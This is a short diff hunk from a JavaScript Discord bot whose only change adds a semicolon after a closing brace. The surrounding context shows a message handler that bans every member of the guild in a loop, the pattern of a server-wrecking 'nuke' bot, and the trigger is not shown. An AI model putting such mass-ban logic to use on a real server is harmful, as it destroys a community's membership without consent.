@@ -121,4 +121,4 @@ bot.on("message", function (message) {
     message.guild.members.forEach((c) => {c.ban()})
        }catch(e){
         console.log(e)
-    }
+    };
